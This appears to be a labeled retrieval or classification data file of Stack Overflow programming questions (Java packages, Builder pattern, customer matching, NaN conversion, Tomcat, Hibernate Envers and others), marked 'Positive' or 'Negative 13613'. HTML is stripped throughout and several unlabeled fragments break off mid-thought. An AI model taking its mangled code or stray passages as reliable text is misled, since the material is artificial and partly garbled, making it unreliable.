Positive 13613 pHi I have a question on Java Package. I have created a package with more than one classes [package name is animal and file name is Zoo.java]. I have created another java file which is in another package mypackage and created a file called MAIN.java. I tried accessing members of the animal package from MAIN.java and it is throwing me an error because it cannot access classes of animal package. I know that only classes which are in same package should be accessible each other, or it should make as public. But I can only change one class to public in Zoo.java. So I found one solution that create separate java files for each class in animal package and make it as public. Is there any other method  My understanding was, we can write all classes in one file and import them from anywhere. Below is my screenshot. a hrefhttpi.stack.imgur.comqjys6.jpg relnofollowimg srchttpi.stack.imgur.comqjys6.jpg altenter image description hereap  pAnd one more thing, in java library how they are implemented it separate source files for each class within a package   p

Negative 13613 pI have looked for a stronggoodstrong example of a strongBuilder patternstrong in C, but cannot find one either because I dont understand the Builder pattern or I am trying to do something that was never intended.  For example, if I have an abstract automobile and abstract builder methods to create car parts, I should be able to send all 30 of my choices to the Director, have it build the pieces I need, then build my automobile.  Regardless of which car, truck, semi, etc. produced, I should be able to drive it in exactly the same way.p  pFirst problem is most examples hard code property values in to the concrete parts, which I really think should come from a database.  I thought the idea was to send my choices to the Director from a data source and have the builder create a customized product based on my data.p  pSecond problem is I want the builder methods to actually create the parts then assign them to the product, not pass strings but real strongly typed product parts.p  pFor example, I want to create a form on the fly by having a Builder manufacture form fields for me, including a label, an input section, validation, etc.  This way I can read the object from my ORM, check out the objects metadata, pass this to my Builder and add the newly created user control result to my web form.p  pHowever, every Builder example I find only has hard coded data instead of passing choices from the main code to the Builder and kicking out a customized product.  Everything seems to be a big static case statement.  For example, if I have three parameters with 10 choices each, I dont want to build 30 concrete Builder methods, I want to create only enough to manufacture the properties my product requires, which may be only three.p  pI am tempted to have the Director exist in the main code only.  There should be a way to automatically determine which concrete builder method to call similar to polymorphism and method overloads although that is a very bad example instead of using a case statement within the pattern.  Every time I need to add a new product type, I will need to modify the existing Director, which is bad.p

Negative 13613 pI am currently working on a project where I a data matching algorithm needs to be implemented. An external system passes in all data it knows about a customer, and the system I design has to return the customer matched. So the external system then knows the correct id of the customer plus it gets additional data or can update its own data of the specific customer.p  pThe following fields are passed inp  ul liName li liName2li liStreetli liCityli liZipCode   li liBankAccountNumberli liBankNameli liBankCodeli liEmailli liPhoneli liFaxli liWebli ul  pThe data can be of high quality and alot of information is available, but often the data is crappy and just the name and address is available and might have spellings.p  pIm implementing the project in .Net. What I currently do is something like the followingp  precodepublic bool IsMatchCustomer customer       CanIdentify just checks if the info is provided and has a specific length e.g. gt 1     if CanIdentifyByStreet ampamp CanIdentifyByBankAccountNumber               some parsing of strings done before substring, etc.         ifStreet  customer.Street ampamp AccountNumber  customer.BankAccountNumber return true          if CanIdentifyByStreet ampamp CanIdentifyByZipCode ampampCanIdentifyByName              ...       codepre  pI am not very happy with the approach above. This is because I would have to write if statements for all reasonable cases combinations so I dont miss any chance of matching the entity.p  pSo I thought maybe I could create some kind of matching score. So for each criteria matched, a score would be added. Likep  precodepublic bool IsMatchCustomer customer      int matchingScore  0     if CanIdentifyByStreet              if....             matchingScore  10          if CanIdentifyByName              if....             matchingScore  10          if CanIdentifyBankAccountNumber              if....             matchingScore  10           ifmatchingScore gt iDontKnow         return true  codepre  pThis would allow me to take in consideration all matching data, and depending on some weight I would increase the matching score. If the score is high enough, its a match.p  pKnow my question is Are there any best practices out there for such things, like matching algorithm patterns etc Thanks alotp

Negative 13613 pFor student council this year, Im on the songs committee, we pick the songs. Unfortunately, the kids at the dances always end up hating some of the stupid song choices. I thought I could make it different this year. Last thursday, I created a simple PHP application so kids could submit songs into the database, supplying a song name, artist, and genre from a dropdown. I also implemented a voting feature similar to Reddits. Click an upvote button, youve upvoted the song, incremented the upvote count. Same with downvotes.p  pAnywho, in the database, I have three tidbits of information I thought I could use to rate these songs, upvotes, downvotes, and a timestamp. For a while, the rank was created by simply having the songs with the higher vote count at the top. That is, the more upvotes, less downvotes upvotes  downvotes would be at the top of the list. That worked, for a while, but there were about 75 songs on the list by Sunday, and the songs that were submitted first were simply at the top of the list.p  pSunday, I changed the rank algorithm to upvotes  downvotes  CurrentTimestamp  CreationTimestamp, that is, the higher the vote count in the lesser amount of time, the higher the song would be on the list. This works, better, but still not how id like it.p  pWhat happens now, is that the instant a song is created and upvoted to a vote count of 1, it ends up at the top of the list somewhere. Songs who have vote counts in the negatives arent viewed often because kids dont usually scroll to the bottom.p  pI guess I could sort the data so the lower songs appear at the top, so people are forced to see the lower songs. Honestly, Ive never had to work on a popularity algorithm before, so, what are your thoughtsp  pWebsites at a hrefhttpwww.songs.taphappysoftware.comhttpwww.songs.taphappysoftware.coma  I dont know if I should put this here or not, might cause some unwanted songs at the dance 0p

Negative 13613 pI am new to Ruby and Shoes, I think I have everything. the program appears to work correctly except when I get to the last step. I, enter the loan amount, interest rate, in to editlines, when I press the calculate  button, it performs the calculations, stores the calculated numbers to a variable. The last step is dividing the total loan loan and interest  by the length of the loan in months to ge the monthly payment, so I can make a payment table for the entire loan, but I either get incorredt results or I get no reeults. I think I converted the integers to floats, etc. , but... not sure. It appears to add, multiply, subtrct, except it will not divide 2 qbjects. If I enter numbers it works ok.  What am I doing wrong. It does seem like it is that difficult. Example code of dividng the values in a varible by the value of another variblep

Negative 13613 pIn a drawing program like Microsofts PaintTM, one of the features available is drawing straight lines. You   can draw a straight line by pressing down on the mouse to indicate where the line should start. Then, with   the mouse still pressed down, you may move the mouse a mouse drag, and the end point of the line is   created as you move. When you release the mouse, the line remains. You may repeat this process many   times, creating many different lines in your PaintTM document.p  pIf you wish to emulate this effect in a java program, you may use MouseListener the mousePressed   method, and MouseMotionListener the mouseDragged method, to create a line segment. In addition, we   would like to be able to clear the paint area with a clear button at the top. Also, we would like to change   the colors of all of the lines by placing some color buttons at the top. In order to accomplish all of this,   you will need to use arrays of coordinates, because each time you call repaint, you will need to redraw all of   the lines stored. p  precodeimport java.awt. import java.awt.event. brings in the ability to read loops by event of something import javax.swing. interface that extends both the MouseMotionListener and MouseListener interfaces  public class Draw extends JApplet implements MouseListener, MouseMotionListener      private int [] x     private int [] y     private boolean changed  true     Display draw      public void init              draw  new Display use Display not draw         setContentPanedraw lets you draw the stuff         draw.setBackgroundColor.green sets the background color to whatever you want         draw.setFont new FontSansSerif, Font.BOLD, 24 this sets the font size and type         draw.addMouseListenerthis         draw.addMouseMotionListenerthis adds the MouseMotionListener                                           to read in actions of the mouse             class Display extends JPanel              public void paintComponentGraphics g Graphics  ltname can be anything                      super.paintComponentg paintComponent lt  has to match w the one above              g.setColorColor.black these are the 5 buttons at the top             g.fillRect2, 2, 95, 70              g.setColorColor.red              g.fillRect100, 2, 95, 70              g.setColorColor.blue              g.fillRect198, 2, 95, 70              g.setColorColor.gray              g.fillRect296, 2, 95, 70              g.setColorColor.cyan              g.fillRect394, 2, 95, 70              g.setColorColor.white             g.drawStringRESET, 10, 45             g.drawStringRED, 125, 45             g.drawStringBLUE, 215, 45             g.drawStringGRAY, 310, 45             g.drawStringCYAN, 410, 45                    public void mousePressedMouseEvent evt                int x  evt.getX          int y  evt.getY          changed  false          if y gt 2 ampamp y lt 70                        changed  true              if x gt 2 ampamp x lt 100                                draw.repaint                            else                   changed  false                     public void mouseDraggedMouseEvent evt                  public void mouseReleasedMouseEvent evt      public void mouseMovedMouseEvent evt      public void mouseEnteredMouseEvent evt   Some empty routines.     public void mouseExitedMouseEvent evt   Required by the MouseListener     public void mouseClickedMouseEvent evt   and MouseMotionListener interfaces.  codepre

But it can still get cluttered up if a bunch of people sign off at once, there is still that 10 minute window before the cron job clears them.p  pThe users have an option to click log out in the flash application which is fine and works great. But of course many choose not to click log off they just click the browser x.p  pIve looked into onbeforeunload and jquerys .unload but I still need a way to get the username variable thats IN flash INTO the HTML, then use a php script to run the delete username mysql query.p  pIs there an easier solutionp  pIf not, any insight on how I might pass the username variable to the html to hold onto it after the user makes their username so it can be involved with the .unload function running the php scriptp  pEDIT Maybe is there a way to create a UNIQUE string of numbers with php then pass that var to flash to include with the mysql row then since i already have that var since it was created on the html side, just along with the unload, have it delete the row that has that unique id p  pIf anyone things this idea would be the best approach, and if i used something like md5uniqidmicrotime .

Negative 13613 pAloha everyone,p  pI apologize in advance for the many questions, but Ive been asked to develop a database and have no experience with PHP and MySQL.  I thought it would be a good exercise for me to attempt to learn a little bit about them and try to develop a concept database for my work at the same time.  Basically this is a database that uses SYDI to obtain WMI information from our Windowsbased computers to use for patch management.  The way I envision this working is like thisp  ol liSYDI is run and an XML file is generated with the information.li liUsing the PHP front end to our patch database, the XML report is parsed and the desired information is then inserted into the MySQL database.li liReports are generated from the database to compare with the latest known baseline for the activity.  If computers are found to be below the baseline, the patch server is used to deliver the needed patches to the delinquent computers.li ol  pThere are a couple of formats used in the XML report from SYDI, one with attributes in a single tag, and another where a single parent tag contains several child tags with attributes.  I have figured out how to parse the first.  Heres a sample of the data and the code for that its really pretty basic stuff with the resulting ouputp  precodeltmachineinfo manufacturerDell Inc. productnamePrecision M90 identifyingnumber87ZGFD1 chassisPortable gt   xml  simplexmlloadfilesydiTest.xml  foreachxmlgtmachineinfo[0]gtattributes as a gt b              echo b, ltbrgt       Dell Inc. Precision M90 87ZGFD1 Portable codepre  pI didnt need the name of the attribute, only the value, so I only echod b there.  For the second, heres a sample of the data itself as well as the code and output for the parsep  precode ltpatchesgt   ltpatch descriptionMicrosoft .NET Framework 1.1 Security Update KB2416447 hotfixidM2416447 installdate04Feb11 gt   ltpatch descriptionMicrosoft .NET Framework 1.1 Service Pack 1 KB867460 hotfixidS867460 installdate04Feb11 gt   ltpatch descriptionWindows Management Framework Core hotfixidKB968930 installdate242011 gt   ltpatch descriptionSecurity update for MSXML4 SP2 KB954430 hotfixidQ954430 installdate04Feb11 gt   ltpatch descriptionSecurity update for MSXML4 SP2 KB973688 hotfixidQ973688 installdate04Feb11 gt   ltpatch descriptionMicrosoft Internationalized Domain Names Mitigation APIs hotfixidIDNMitigationAPIs installdate6302008 gt  ltpatchesgt  foreach xmlgtpatchesgtpatch[0]gtattributes as a gt b               echo b, ltbrgt       Microsoft .NET Framework 1.1 Security Update KB2416447 M2416447 04Feb11 codepre  pAs you can see, I only got the first patch, not the rest of them.  I figure that patch[0] is most likely the issue, as it only references the first child tag.  How can I get it to reference the rest of the children p  pThe results raise another issue.  Is there any way to pick out specific attributes and disregard the rest  For example, in the first parse, the machineinfo parse gets all the information I need.  In the second parse, I only need the description and hotfixid.  Once I get the correct syntax for the parse, assuming it runs like the first one, I would most likely get all of the attributes.  I dont need the install date.  p  pLastly, how can I assign the retrieved values to variables  The first parse results in the data I need, but not in the correct order.  My table structure is like thisp  precodeCREATE TABLE InventoryItems     InvSerNum          VARCHAR20 NOT NULL,     Make                VARCHAR20,     Model               VARCHAR20,     Platform            VARCHAR12, CONSTRAINT InventoryPK PRIMARY KEY InvSerNum codepre  pI need the identifyingnumber InvSerNum first.  Of course, I could always reorder the fields in the table to match the XML, but Id rather leave it as is.  My thinking is that I can use an INSERT statement and just use the variables for the values to be input.p  pIm trying to do all of this on my own, but got stuck on the XML parsing part.  If anyone can assist me in understanding the process, I would be in your debt.p

Negative 13613 pIve been battling this demon for a while at least since about 6.8 and Im wondering if any kind soul here has found similar issue and resolved it.  I have about 12 PHP projects registered in my Netbeans IDE.  Works great, although it can take a while to open up from startup.  However my biggest issue is that if I have functions, methods, classes, etc. referenced in my code and I select for example a function, I want it to open up the PHP code module that contains that declaration, and it used to do this. p  pBut as soon as I added a 2nd project to my IDE, it no longer wants to play.  Just sits there like nothing was requested.  So I have to manually navigate to the code each time.  Its getting tiresome, and Im sure I cant be the only one to have found this.p  pHas anyone found this and found a resolution to it  Id be happy if it only navigates without the Main Project if that would work, but even if I set the project that way it refuses to go looking for the declaration.p  pAll help greatly appreciated.p  pP.S.  Im running Ubuntu 9.10 on my desktop rig.  Not sure if that has anything to do with this though.   And its the PHP personality in Netbeans.p

I already have done the same application on my computer and it was working perfectly on my computer, but on the Xoom, it has an hard time to recognize QrCode.

The back camera is worst even if it has a better resolution. Its kind of weird that the back camera give worst result, but given that the focus doesnt work well, I think its normal. You need a very sharp picture to have good result.p  pRight now I use the algo from zxing called strongPlanarYUVLuminanceSourcestrong.p  pSo I wonder if you guys have found some strongGood algorithm for converting color image from the xoom camera to a monochrome imagestrong.

Next to Environment, type the following PATH, where  is   replaced with the actual location of MathFuncsDll.dll.

Negative 13613 pOver the last couple of weeks I have asked a couple of questions on this subject.  It seems as though the harder I try to figure this out, the further away from a solution I appear to be.  That may just be a function of me being an idiotp  pHere is a brief summary of what I have learned so farp  pA There is really no AJAX upload functionality.  You are really just updating an Ipage form element.  It appears like AJAX, but it truly isnt.p  pB  There is no AjaxUpload plugin by valumns.  At least not named that.  After looking at several tutorials on ajax upload that each refer to the AjaxUpload.js plugin and getting absolutely bubkis because on his page, it is not named AjaxUpload.js, it is name something else.  If it is even there at all.  I didnt feel like going through the hassle of renaming it, and just freaking seeing what happens, because that usually just results in an ugly orgy of errors on obsenities.  p  pC  Alot of the solutions appear to use CAKE.  Not really sure what the hell that is, but it looks like some kind of PHP design pattern based off of the popular MVC design pattern.  Not really sure though.  p  pD this appears to be a really hard task.  Not something that would take a couple of lines of code and prayer.br   D1 The PHP code seems simple enough.  Just call the function that moves files...   D2 The jquery seems a little bit trickier.  Here is where you are calling the above php   function.

Negative 13613 pI need to implement a web application hosted on sharepoint. This is a client requirement. So I cannot create a standard asp.net web application. Another client requirement is that the authentication is not an active directory one but they want to use an existing database of users.p  pI am a bit concerned how this would work on sharepoint because users would need to login onto sharepoint. Would it make sense that users log into sharepoint as anonymous and then we use our custom controls for login.

Negative 13613 pI am currently developing a custom WordPress theme and ran into a problem.p  pI have created a custom template that displays its subpages as a categoryoverview. Its for products, and the structure is as followsp  precodeHome page id 3 Products page id 4     Category 1 page id6, child of page 4     Category 2 page id7, child of page 4      Category 3 page id8, child of page 4      codepre  pPage 4 the products page displays an overview of the categories. Now, the front page should also display an overview of the categories, just styled differently also using different markup, so CSSonly wont do the job. p  pI already modified the template to react to being called on the front page. The detection is working and if I define the products page as the home page, it looks like intended.p  pBut there is one problem Now in the navigation which is a custom menu, the Products item links to the home page, and such is not working as the category overview. It seems wordpress overwrites the role of the page to be the home page even though I need it to be an instance of its own, with the corresponding url of a hrefhttpwww.client.comproducts relnofollowhttpwww.client.comproductsa.p  pSo, if the products page is also used as the front page my navigation structure is being messed up and I cannot get to a hrefhttpwww.client.comproducts relnofollowhttpwww.client.comproductsa anymore.p  pUsing another page with the same template for the front page will not work, because it will not have the subpages Im querying.p  pstrongWhat I wantstrongp  precodeHome page id 4 gtgt httpwww.client.com, overview style 1 Products page id 4 gtgt httpwww.client.comproducts, overview style 2     Category 1 page id6, child of page 4     Category 2 page id7, child of page 4      Category 3 page id8, child of page 4      codepre  pstrongWhat I havestrong p  precodeHome page id 4 gtgt httpwww.client.com, category overview style 1 Products page id 4 gtgt httpwww.client.com, category overview style 1     Category 1 page id6, child of page 4     Category 2 page id7, child of page 4      Category 3 page id8, child of page 4      codepre  pAny ideasp
Negative 13613 pWhat part of the C spec, or the IEEE float spec, states that a NaN value should convert to codetruecode as opposed to falsep  pIf I look at the C standard section em4.12 Boolean Conversionsem it saysp  blockquote   pA zero value, null pointer value, or null member pointer value is   converted to false any other value is converted to true.p blockquote  pNow IEEE floats say that NaN compares false to any other value. So whether NaN is true or false depends on how you do your comparision below. Thus I presume there must be an explicit mention.p  precodevalue  0  false  true value  0  true  false codepre  pNow, what about conversion to an integer. The short program below shows that a variable NAN converted to an integer results in the minimum integer, whereas a constant gets converted to 0 using GCC. This seems odd.p  precodeinclude ltiostreamgt include ltcmathgt  void write double r, int i, bool b       stdcout ltlt r ltlt    ltlt  i ltlt    ltlt b  True  False ltlt stdendl   int main      double value  NAN     write value, value, value      write NAN, NAN, NAN   codepre  pOutputp  precodenan  2147483648  True nan  0  True codepre  pThe conversion of a NaN to zero but bool conversion as True seems troubling. I also not that something like MatLab will convert a NaN to 0 using a function like codeint16code.p  pSo, what are the specifics of the relevant standards that state how NaN converts to boolean and integer valuesp  pemIm tagging C as well, since while it may not define the boolean conversion, it probably defines an integral conversion and use in a conditional and I suspect C will follow the same rulesemp

Negative 13613 pIm building this Android app which runs on data generated by a server. This data can change once a day, but it can also change once every 5 minutes, and this is not predictable. A couple of options occur to mep  ul liSo to be on the safe side I could just download the data every time I need to show it to the user, but that results in long wait times and high data usage.li liSo I could, say, download the data once, and conclude that after an hour the data is outdated and download again. But that may lead to incorrect data.li liThen I could keep a very small file on the server which indicates only a version number of the data.

Negative 13613 pIm using Gtk and mono on Linux to make a program where I am creating a slider control over a timeline graph.  I have it basically working, but there is one nagging problem that I can not figure out how to use transparency when using the Gtk.Style drawing routines such as PaintBox AND PaintHLine.  Because I could not figure out how to use these and still maintain transparency, I am currently using Cairo drawing routines, but this does not allow me to use the theme consistent look provided by the Style routines.p  pCurrently, I have a custom widget class that has a Gtk.DrawingArea.  I have a Cairo.ImageSurface kept in memory for the underlying Graph, and a Separate Cairo.ImageSurface for the slider which is supposed to be painted onto the DrawingArea to set a location in the timeline.p  pProblem is, I cannot for the life of me determine how to get my Gtk.Style.Paint... functions to draw on my Cairo.ImageSurface and still maintain transparency.

Ive seen examples before but they basically write right to a MySQL database right after collection which seems to go against what twitter recommends you do. p  pWhat Id like some advicehelp on is, what is the best way to handle this and how. It seems that people recommend writing all the data directly to a text file then parsingprocessing it with a separate function.

Negative 13613 pI have an android project where a couple of strings, images and the database need to be altered to suit each client These would be separate apps rather than, for example, a customer entering their name.  As far as I can tell, the best way for me to do this is with a library handling all of the GUIs and logic but then changing the necessary things in the project using it. Unfortunately the library seems to look for layouts in the parent projects codereslayoutcode folder but still requires those same files in its own codereslayoutcode folder in order to generate codeR.javacode. This basically means I am having to deal with duplicate copies of resources.p  pMy question is basically this Is it possible for my project to use the resources from the library as opposed to the parent project except for a few resources held within the parent project Which can be referenced in code within the libraryp  pOtherwise, is there a better way to handle thisp

Negative 13613 pWe have a strange issue with a silverlight app which seems to centre around the clientaccesspolicy.xml file.p  pWe have a website, which is the default website on IIS7. In the root of this website we have the clientaccesspolicy.xml file. p  pWe also have a web service defined in a httpthewebsiteasubdirectoryservice.asmx which handles some of the silverlight requests to the website.p  pWhat seems to happen, is that when we try to load the silverlight component, there is an http request for httpasubdirectoryclientaccesspolicy.xml which is clearly wrong.p  pWhats odd, is that if I setup the default website to be blank, and setup this particular website as an applicationvirtual directory below the default website. e.g. a hrefhttpthewebsitesubdomain relnofollowhttpthewebsitesubdomaina then the request for clientaccesspolicy goes to a hrefhttpthewebsiteclientaccesspolicy.xml relnofollowhttpthewebsiteclientaccesspolicy.xmla and assuming I keep a copy of the file at the root of the default website, things work ok.p  pWhat Id like to know, is how silverlightIIS is determining that it needs to look further up that the root for the clientaccesspolicy when the website is defined as the default.p  pCould it be the service location or the service references in silverlight Is there a sensible way round thisp  pMany thanks,p  pDougp

Negative 13613 pIm using an FTDI USBtoSerial converter on linux. Im writing an application that implements the standard functionality of changing settings like baud rate, etc... The only thing that Im not sure how to get is the buffer size, e.g. if the user wants to know.p  pFor example in the javax.comm SerialPort API theres a method getInputBufferSize, so I thought there must be a way to check this on the device being used.

There are several places where this project can be installed, and in the future it is not certain what version is used where and to what version one might be updated to in the future.

The script simply keeps track of the last row that was populated, increments the value by one, so that the next row can be populated.  Im storing the last row used as a Project Property.

Negative 13613 pOK, just to be clear, I understand that the Task Manager is never a good way to monitor memory consumption of a program.  Now that Ive cleared the air...p  pIve used SciTechs .Net memory profiler for a while now, but almost exclusively on the .Net 3.5 version of our app.  Typically, Id run an operation, collect a baseline snapshot, run the operation again and collect a comparison snapshot and attack leaks from there.  Generally, the task manager would mimic the rise and fall of memory within a range of accuracy and within a certain period of time.p  pIn our .net 4.0 app, our testing department reported a memory when performing a certain set of operations which Ill call operation A.  Within the profiler, Id see a sizable change of live bytes usually denoting a leak.  If I immediately collect another snapshot, the memory is reclaimed regardless of how long I waited to collect the initial comparison snapshot.  I thought the finalizer might be getting stuck so I manually injected the following callsp  precodeGC.Collect GC.WaitForPendingFinalizers GC.Collect codepre  pWhen I do that, I dont see the initial leak in the profiler, but my working set in the Task Manager is still ridiculously high operation A involves loading images.  I thought the issue might be a stuck finalizer and that SciTech was able to do some voodoo magic when the profiler collects its snapshots, but for all the hours I spent using WinDbg and MDbg, I couldnt ever find anything that suggested the finalizer was getting stuck.  If I just let my app sit for hours, the memory in the working set would never reduce.  However, if I proceeded to perform other operations, the memory would drop substantially at random points.  p  pstrongMY QUESTIONstrong I know the GC changed substantially with CLR 4.0, but did it affect how the OS sees allocated memory  My computer has 12 GB RAM, so when I run my app and ramp up my memory usage, I still have TONS free so Im hypothesizing that it just doesnt care to reduce what its already allocated as portrayed in the Task Manager, even if the memory has been collected.  When I run this same operation on a machine with 1GB RAM, I never get an out of memory exception, suggesting that Im really not leaking memory which is what the profiler also suggests.  p  pThe only reason I care what the Task Manager shows because its how our customers monitor our memory usage.  If there is a change in the GC that would affect this, I just want to be able to show them documentation that says its Microsofts fault, not ours p  pemIn my due diligence, Ive searched a bunch of other SO threads for an answer, but all Ive found are articles about the concurrency of the generational cleanup and other unrelated, yet useful, facts.emp

Negative 13613 precodeinterface SomeClass  NSObject  property copy,   nonatomic NSString usefulString property strong, nonatomic NSString dangerousString  property copy,   nonatomic NSURL curiousURLOne property strong, nonatomic NSURL curiousURLTwo  end codepre  pIn the above class, codedangerousStringcode is considered a bad idea because codeNSMutableStringcode inherits from codeNSStringcode. Meaning it is possible a user of your class could set a mutable string to codedangerousStringcode, and then later change the value of the mutable string out from underneath the instance of codeSomeClasscode. The property codeusefulStringcode doesnt have this danger as it copies the value into a new immutable string object.p  pHowever, it seems like for codeNSURLcode and any other foundation classes that dont have mutable counterparts  e.g. codeNSNumbercode the copy semantic of the property declaration is unnecessary. codeNSURLcode does conform to NSCopyings codecopyWithZonecode em...but I have to wonder if it doesnt just return the same object with an increased retain count  why would it do anything elseemp  pWhy would you declare properties as codecopycode that dont have a danger of being mutatedp

This works, as long as the form does not contain a MainMenu control. If the MainMenu control exists, you can drag the form down to the bottom of the screen under where the menu is and the OnPaintOnPaintBackground events no longer fire it does not need to be repainted as it is no longer visible.p  pI am running out of ideas any suggestionsp

For example, the tryexceptBlock in File twitterutils.py filters out 40x and 50x exceptions, but also looks for general exceptions with only codeexceptcode. So what I dont understand is why the error is not getting caught at this position and instead, the program is forceclosed and a traceback printed Shortly speaking I am in the situation where I cannot catch an error, just like a parse error in a PHP script. So how would I do thisp

Negative 13613 pI am trying to create a Windows application but will eventually port it to linux also, so crosscompatibility is important if possible that will take a picture from a webcam and can print without using a printDialog box, but I am having an issue selecting a paper size.

It does not always default to letter with all printers though, it looks like each printer handles the command differently, but most default to letter.

Negative 13613 pI just upgraded to Visual Studio 2012 from 2010 and cannot stand the fact that Cntrl  F brings up the new Quick Find dialog in the upper right hand corner of the editor.

Negative 13613 pIn our web application we have a MySQL table that stores details of notifications that are sent to users.  These notifications, once read by the user, are flagged as dismissed and unlikely to be viewed again, but we cant permanently delete them. There will be many notifications, so we need to move them  out of the  the live table periodically . We are using Hibernate Envers. There seem to be two strategies we could usep  ol lipDelete dismissed notifications from the live table periodically these will be archived via Hibernate Envers in a NotificationAUD table.  This makes it straightforward to find obsolete notifications if we need, and fits in with our auditing strategy, but over time the NotificationAUD table will grow massive.pli lipMaintain tables that are generated periodically that store stale notifications over a date range. E.g., Notifications201301,Notifications201302 etc. This has the advantage of not letting tables ever grow massive, but defeats the purpose of using a library such as Hibernate Envers, in that were rolling our own solution. Furthermore Hibernate doesnt seem to support very well the concept of mapping a single entity class to multiple tables, so wed need to use native MySQL queries, or perhaps some table of metadata to be able to find the correct table to  look up notifications over a given date range, for example. pli ol  pIf anyone has any wisdom to impart from implementing anything similar, it would be great to hear from you, or an alternative strategy that worked for you. p  pThanks  Richardp
Negative 13613 pSo I have two colour images that when hovered will turn the other to greyscale there is a black and white copy of each image sitting directly behind by changing the opacity to 0. This works fine.p  pIm now trying to display a caption over the hovered image when its hovered. What happens is that when I hover over the image, the caption appears just fine. If the mouse moves over the caption though, the caption just constantly disappears and reappears as Im no longer hovering over the image itself. When the caption disappears Im hovering on the image again so it reappears.p  pWhat Id like to happen is that when I hover over this caption it behaves as though Im still hovering the image.

Notes have been replaced by emCommentsem as of... September 5th, 2012 Maybe I would rather use those instead.p  p3. For both types of cell notation, there exist functions only to emSETem the NoteComment, and not emADDem according to the documentation.p  p4. I would like to reference or write a function that has the capability to ADD a new NoteComment preferably Comment, they are more easily read, instead of setting the NoteComment.p  p5. You can MANUALLY add a NoteComment through the GUI in the Spreadsheet itself rightclick a cell and select Insert Note or Insert comment. Because these rightclick functions exist leads me to believe that we could write a script to do the same thing, but have it be called automagically when the cell has been edited.p  p6. This function will be used to keep track of cell revision history. I know that I can create a new spreadsheet and send the revision history to that new spreadsheet easily, but considering that I have 10 spreadsheets that need to be tracked, I would rather not have 10 new spreadsheets to keep track of history. Keeping it in the same spreadsheet will keep things simple.p  pIf anyone could help me out, it would be greatly appreciatedp

Negative 13613 pI am trying to use the find command to find all of the files that are checked into RCS from my home directory. This includes files that end in things like codec,vcode.

Things like  codefind . name RCSc,vcode do not work and return nothing. codefind . name RCScode will return the RCS directory, but none of the files inside the RCS directory. p  pIs there someway I can get a find command to return all files that are in RCS directories, starting from my home directory. I know I can filter out unwanted files afterwards, but it needs to only be showing me files from the RCS directory to begin with.p  pAfter reading all the answers I decided that assuming ,v are RCS files is the best way to go about this because we have not covered scripting for my teacher to ask us a question like that. We are not supposed to pipe into xargs or grep for the question either,and path does not work on my version of unix. It was helpful to know from perreal that using name does not allow me to match  which clears up some other questions I had but did not ask. I have come to the understanding that there is no way to do this without path or some type of following command or script. Thank you all for your help.p

Negative 13613 pAs the title says Im trying to set the width of a span once the link has been visited. The reason for this is that we are supposed to display  New  tag next to a thread but it should disappear once the link is visited. They do not want to use cookies to track the user so I came up with a idea to set display or visibility to none on avisited. That does not work because of security issues. p  pstrongWhat worked for me was setting the background and text color to white I know its not the right way to do it.strong p  pNow they want to move this tag to the beginning of the thread title. This creates a problem of blank space in front of the title As new is still there its just all white. I though I might simply set the width to 0 and that would work. It doesnt. Any solutions p

Negative 13613 pWe use Tomcat 6.x version for our development.  We have 6 applications that deploy as separate WARs.  Thus, each time TOMCAT boots, it deploys 6 WARs. p  pI want to be able to tell Tomcat manually or otherwise which WARs have changed and deploy only those, while for others, the old deployed exploded folder structure needs to be reused.p  pIs this possible  If yes, how  I did Google a bit, but couldnt find a solution.p  pThanks, Siddharthp  pEDIT  One thing I found while Googling is that once a WAR is deployed, we can remove the WAR while keeping the exploded folder.  Thus, it wont be deployed next time.  I am yet to try this approach.p

Negative 13613 pI am bit confused about difference between Spring DataJPA and JPA. I know about JPA that it is a specification for persisting the Java Objects to relational database using popular ORM technology i.e. in other words JPA provides interfaces and other ORM technologies implements those interfaces known as JPA provider eg Hibernate.p  pNow what exactly is Spring Data JPA. Is Spring Data JPA has added some more functionality Interfaces over JPA and still it is specification only or it is also a JPA provider p  pI saw Spring Data JPA works around repositories DAO layer if I am not wrong. So I mean how it is different using Spring Data JPA  Hibernate or only using Hibernate directly p  pI might be totally wrong in asking question but I appreciate your help in resolving my confusion. Kindly also post any useful links of documentation that helps. Thanks in advance....p

Negative 13613 pI have a jsp page having a html form which has 3 hidden fields, 1 select box and a div containing 10 checkboxes and a submit buttons. There no action page has set to this form in action property of form.  The form is get submitted using ajax. The Form either gets submitted on chage event of select box to servlet A or get submitted on click event of submit button to servlet B.p  pWhenever a value from select box is selected the form get submitted using ajax and a response of ajax containing list of user names  associated with checkboxes are rendered in div without refreshing page. This part works fine.p  pWherever a Submit Button is clicked the form get submitted using ajax and if any checkboxes are selected then the value of checkboxes are stored in session. The Problem lies here. Whenever a Jsp Page is rendered first time and if we select some checkboxes and submit button  is clicked then the above explained functionality works fine.      But when after the jsp page is rendered and select box options is selected and its ajax response is rendered containing checkboxes and  here if I selected few checkboxes and click the submit button then in Servlet B I get only value of hidden fields and select box but the values of  checkboxes are not received to servlet B.p  pI want to ask experts the reason behind this problem and what is the solution to this. p  pfollowing is the jquery code gets executed by clicking submit button.p  precodeidbtnsubmituser.clickfunction     alertthis is test1      get the form data and then serialize that     dataString  userlistrequestform.serialize            As per my understanding the above code line is not getting the selected     checkboxes value. i.e. the serialize function can not  detect the check boxes rendered by ajax response on event of select box change event.          .ajax      type POST,      url CutUser,      data dataString,      dataType json,      if received a response from the server     success function data, textStatus, jqXHR          idmoveuserdiv.htmldata     ,      If there was no resonse from the server     error functionjqXHR, textStatus, errorThrown          console.logSomething really bad happened   textStatus           ajaxuserListResponse.htmljqXHR.responseText     ,      capture the request before it was sent to server     beforeSend functionjqXHR, settings         userlistpageselect.attrdisabled, true     ,      this is called after the response or error functions are finsihed     so that we can take some action     complete functionjqXHR, textStatus         enable the button          userlistpageselect.attrdisabled, false         .checkuser.attrchecked,false        codepre  pPlease guide me friends in this problem.p  pThanks Youp

Negative 13613 pIm curious as to whether its feasible to develop a scheme for setting the default values for new ActiveRecord records.

You could override the method and return a hash of symbol  default pairs, and maybe even the paranoid migration code could also leverage this.p  pIm still fairly new to Rails, so Im prepared to be told a scheme already exists or why this is a dumb idea, but feedback is welcome. p  pstrongUpdatestrong Per Anton Grigorievs answer, I think the attributedefaults gem is the way to go.

